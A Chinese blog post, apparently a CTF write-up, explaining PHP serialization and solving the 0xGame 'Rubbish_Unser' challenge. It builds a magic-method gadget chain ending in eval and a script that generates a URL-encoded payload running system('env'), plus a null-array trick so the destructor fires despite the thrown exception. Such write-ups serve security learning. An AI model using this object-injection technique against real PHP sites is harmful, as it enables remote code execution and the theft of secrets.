---
title: 示例文章
date: 2026-01-107
category: wp
tags: ["Markdown", "ctf", "基础漏洞"]
excerpt: 0xgame 2025 Rubbish_Unser初识PHP反序列化
---

# 基础PHP反序列化漏洞

## 什么是序列化

序列化是指将变量转换为一种可保存或传输的字符串形式的过程；

而反序列化则是在需要的时候，将这个字符串重新转换回原来的变量形式以供使用。

这两个过程相辅相成，为数据的存储和传输提供了极大的便利，同时也使得程序更加易于维护和扩展。

## 初步了解

- `serialize()` 是 PHP 中一个非常重要的函数，用于将变量（如数组、对象等）转换为可存储或传输的字符串格式
- `unserialize()` 是 PHP 中一个极其强大但也极度危险的函数，用于将通过 `serialize()` 生成的字符串还原为原始的 PHP 变量（如数组、对象等）

```PHP
<?php
class Person
{
    public $name; //public 修饰的这个成员在任何地方都可以使用
    private $age; //private 修饰的成员只能被 其所在类 的其他成员访问
    protected $sex; //protected 修饰的类成员 所在类的子类以及同一个包内的其他类 访问

    function sayName()
    {
        echo $this->name;
    }
    function sayAge()
    {
        echo $this->age;
    }

    function saySex()
    {
        echo $this->sex;
    }

    function __construct($name, $age,$sex)
    {
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;//protected修饰的sex
    }
}
$person=new Person('张三',20,'boy');
$person->sayName();//张三
$person->sayAge();//20
$person->saySex();//boy
echo '</br>';
// 序列化：serialize将php的遍历变量（数组、对象等）转化成一个 可以存储或传输的字符串 表示的函数。即---对象压缩成字符串
echo serialize($person);
//O:6:"Person":3:{s:4:"name";s:6:"张三";s:11:"Personage";i:20;s:6:"*sex";s:3:"boy";}
?>
```

简单来说序列化就是把程序中的数据（比如对象、数组等）转换成一种可以存储或传输的格式（通常是字符串），以便以后能还原回来。

## 牛刀小试

- [0xGame-week1-Rubbish_Unser](https://www.ctfplus.cn/problem-detail/1975492199818727424/description)

```PHP
<?php
error_reporting(0);
highlight_file(__FILE__);

class ZZZ
{
    public $yuzuha;
    function __construct($yuzuha)
    {
        $this -> yuzuha = $yuzuha;
    }
    function __destruct()
    {
        echo "破绽，在这里！" . $this -> yuzuha;
    }
}

class HSR
{
    public $robin;
    function __get($robin)
    {
        $castorice = $this -> robin;
        eval($castorice);
    }
}

class HI3rd
{
    public $RaidenMei;
    public $kiana;
    public $guanxing;
    function __invoke()
    {
        if($this -> kiana !== $this -> RaidenMei && md5($this -> kiana) === md5($this -> RaidenMei) && sha1($this -> kiana) === sha1($this -> RaidenMei))
            return $this -> guanxing -> Elysia;
    }
}

class GI
{
    public $furina; 
    function __call($arg1, $arg2)
    {
        $Charlotte = $this -> furina;
        return $Charlotte();
    }
}

class Mi
{
    public $game;
    function __toString()
    {
        $game1 = @$this -> game -> tks();
        return $game1;
    }
}

if (isset($_GET['0xGame'])) {
    $web = unserialize($_GET['0xGame']);
    throw new Exception("Rubbish_Unser");
}
?>
```

- 吓哭了，先来了解一些魔术方法的调用时机然后进行审计

  - `__construct()`：创建对象时自动调用（构造函数），一般用于初始化
  - `__destruct()`：对象被销毁时（脚本结束、unse）
  - `__get($name)`：访问一个未定义（或不可访问）的属性时
  - `__invoke()`：当把对象当作函数调用时
  - __call($name, $arguments)：调用一个不存在（或不可访问）的方法时
  - __toString()：对象被当作字符串使用时

- 命令执行关键点

  - 销毁对象时触发

  - ```PHP
    function __destruct()
        {
            echo "破绽，在这里！" . $this -> yuzuha;
        }
    ```

  - 访问一个未定义（或不可访问）的属性时

  - ```PHP
    function __get($robin)
        {
            $castorice = $this -> robin;
            eval($castorice);
        }
    ```

- WP

  - ZZZ类对象被销毁时触发__destruct()，首先想到实例化一个ZZZ对象
  - 我们需要访问一个未定义（或不可访问）的属性时才能触发`__get($name)`进行命令执行，那我们就去找符合要求的类，可以看到在HI3rd类对象中完成if判断后会返回guanxing属性的Elysia属性，而在HSR中没有Elysia属性就触发了__get方法，因此我们可以把guanxing属性赋值一个 HSR类的实例
  - 如何绕过if条件判断？要求kiana 属性的值和RaidenMei属性的值不同但是要求MD5和哈希值相同，赋值使用的一个为false一个为空字符串来绕过（其实null也可以,都是空值嘛）
  - 怎么触发__invoke()？在GI类中我们发现__call方法,把GI类对象中的$furina实例化为HI3rd类对象
  - 怎么触发__call()？用一个不存在（或不可访问）的方法时，看到Mi类中的__toString方法中调用了game 属性的tks()方法，我们把$game实例化为GI类对象，该对象没有tks()方法，达成目的
  - 最后把ZZZ类对象中的$yuzuha实例化为Mi类对象，调用__destruct()中echo $this->yuzuha时，会触发Mi类中的__toString()方法
  - 把逆推的思路重新整理编写脚本
  - 

```PHP
<?php
error_reporting(0);
highlight_file(__FILE__);

class ZZZ
{
    public $yuzuha;
    function __construct($yuzuha)
    {
        $this -> yuzuha = $yuzuha;
    }
    function __destruct()
    {
        echo "破绽，在这里！" . $this -> yuzuha;
    }
}

class HSR
{
    public $robin;
    function __get($robin)
    {
        $castorice = $this -> robin;
        eval($castorice);
    }
}

class HI3rd
{
    public $RaidenMei;
    public $kiana;
    public $guanxing;
    function __invoke()
    {
        if($this -> kiana !== $this -> RaidenMei && md5($this -> kiana) === md5($this -> RaidenMei) && sha1($this -> kiana) === sha1($this -> RaidenMei))
            return $this -> guanxing -> Elysia;
    }
}

class GI
{
    public $furina; 
    function __call($arg1, $arg2)
    {
        $Charlotte = $this -> furina;
        return $Charlotte();
    }
}

class Mi
{
    public $game;
    function __toString()
    {
        $game1 = @$this -> game -> tks();
        return $game1;
    }
}

if (isset($_GET['0xGame'])) {
    $web = unserialize($_GET['0xGame']);
    throw new Exception("Rubbish_Unser");
}
$gen = new ZZZ(1);
$gen->yuzuha = new Mi;
$gen->yuzuha->game = new GI;
$gen->yuzuha->game->furina = new HI3rd;
$gen->yuzuha->game->furina->RaidenMei = "";
$gen->yuzuha->game->furina->kiana = false;
$gen->yuzuha->game->furina->guanxing = new HSR;
$gen->yuzuha->game->furina->guanxing->robin = 'system("env");';
$gar = array('1' => $gen, '2' => null);
echo urlencode(serialize($gar));
?>
```

- 执行

![img](https://ai.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDJlYzg0ZjVmN2RjODRiZDNkN2EwNTFmMjY2NmJmNTFfZmJnWmFOTHZReWdRbXgwSVA1SDJ5cmhUajVRa05nSGFfVG9rZW46UExpaGJDRGlPb3ozTDh4Sk5jQ2NzN3FjbmFnXzE3Njc3MjY3NDc6MTc2NzczMDM0N19WNA)

- 传递

![img](https://ai.feishu.cn/space/api/box/stream/download/asynccode/?code=NDAwZWEwNWUyNDA5NWQwNjRjMmQ4MjBlYzkxODM3NTdfNEQxR2QzS1N1NDVLenNwekdZYnBjYWhDRFNGdFk5clJfVG9rZW46QzlNcGJlTDBtb09tUEd4UE12cWNobFlabnFnXzE3Njc3MjY3NDc6MTc2NzczMDM0N19WNA)

- 补充

  -  Q:为什么要

  - ```PHP
    $gar = array('1' => $gen, '2' => null);
    echo urlencode(serialize($gar));
    ```

而不是直接进行echo urlencode(serialize($gen));?

A:观察原题

```PHP
throw new Exception("Rubbish_Unser");
```

这会导致主动抛出一个异常（Exception），并终止当前脚本的正常执行流程

异常抛出导致__destruct不执行的绕过代码最后会throw new Exception，导致对象正常销毁流程被打断，__destruct不触发。


构造一个数组$b = array('1' => $a, '2' => null)，当数组中某个元素被设为null时，PHP 会提前回收该元素对应的对象，从而在异常抛出前触发__destruct，触发垃圾回收（GC）
